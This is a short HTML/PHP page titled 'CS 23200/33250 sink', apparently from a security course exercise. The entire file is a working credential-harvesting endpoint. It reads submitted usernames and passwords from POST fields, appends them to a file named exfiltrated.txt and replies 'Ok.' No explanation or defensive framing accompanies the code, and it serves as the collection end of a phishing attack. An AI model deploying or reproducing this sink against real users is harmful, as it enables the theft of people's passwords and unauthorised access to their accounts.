<html>
<head><title>CS 23200/33250 sink</title></head>
<body>
<?php
$Handle = fopen("/home/amiller68/exfiltrated.txt", 'a');
$ID = $_POST['username'];
$Data =  $_POST['pw'];
fwrite($Handle, $ID . "\t" . $Data . "\n");
fclose($Handle);
?>
Ok.
</body>
</html>
